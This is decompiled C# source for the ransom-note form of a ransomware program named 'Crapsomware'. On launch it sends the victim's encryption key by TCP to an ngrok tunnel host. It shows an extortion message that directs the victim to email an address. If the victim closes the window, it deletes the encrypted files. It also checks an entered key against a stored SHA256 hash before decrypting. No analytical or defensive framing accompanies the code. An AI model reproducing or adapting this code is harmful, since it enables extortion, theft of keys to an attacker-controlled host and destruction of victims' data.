using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Crapsomware;

public class Form1 : Form
{
	public bool allowClose = false;

	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Label label3;

	private TextBox textBox1;

	private TextBox textBox2;

	private Button button1;

	public Form1()
	{
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		try
		{
			byte[] bytes = Encoding.Default.GetBytes(Program.password);
			TcpClient tcpClient = new TcpClient("4.tcp.ngrok.io", 16968);
			tcpClient.GetStream().Write(bytes, 0, bytes.Length);
			tcpClient.Close();
		}
		catch
		{
		}
		InitializeComponent();
		((Control)textBox1).set_Text(Program.password);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Invalid comparison between Unknown and I4
		if (allowClose)
		{
			return;
		}
		DialogResult val = MessageBox.Show("are you suuuuuure want to do this?", "are you suuuuuuuuuure?", (MessageBoxButtons)4, (MessageBoxIcon)32);
		if ((int)val == 6)
		{
			Program.password = "";
			((Control)textBox1).set_Text("Key is destroyed!");
			new Thread((ThreadStart)delegate
			{
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				MessageBox.Show("Key is destroyed! Have fun exploring your corrupted files :)", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}).Start();
			{
				foreach (string item in Program.Files())
				{
					if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) == "." + Program.ext)
					{
						File.Delete(item);
					}
				}
				return;
			}
		}
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		((Control)button1).set_Enabled(false);
		((TextBoxBase)textBox2).set_ReadOnly(true);
		byte[] array = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(((Control)textBox2).get_Text()));
		bool flag = false;
		if (array.Length == Program.hash.Length)
		{
			int i;
			for (i = 0; i < array.Length && array[i] == Program.hash[i]; i++)
			{
			}
			if (i == array.Length)
			{
				flag = true;
			}
		}
		if (flag)
		{
			new Thread((ThreadStart)delegate
			{
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				MessageBox.Show("Valid key! Decrypting files...", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}).Start();
			Program.password = ((Control)textBox2).get_Text();
			allowClose = true;
			((Form)this).Close();
			Program.Decrypt();
		}
		else
		{
			MessageBox.Show("Invalid key! Please try again", "", (MessageBoxButtons)0, (MessageBoxIcon)16);
			((Control)button1).set_Enabled(true);
			((TextBoxBase)textBox2).set_ReadOnly(false);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_Location(new Point(322, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(94, 25));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Oh crap!");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label2).set_Location(new Point(12, 43));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(416, 96));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Your files got encypted by Crapsomware.\r\nYou can't decrypt your files without a special key.\r\nMail your personal id to Kto.Nado.1999@mail.ru\r\nYour personal id:");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label3).set_Location(new Point(12, 391));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(307, 24));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("Enter your personal decryption key:");
		((Control)textBox1).set_Location(new Point(16, 142));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(772, 246));
		((Control)textBox1).set_TabIndex(3);
		((Control)textBox2).set_Location(new Point(16, 418));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(691, 20));
		((Control)textBox2).set_TabIndex(4);
		((Control)button1).set_Location(new Point(713, 416));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(5);
		((Control)button1).set_Text("Decrypt!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Crapsomware note");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
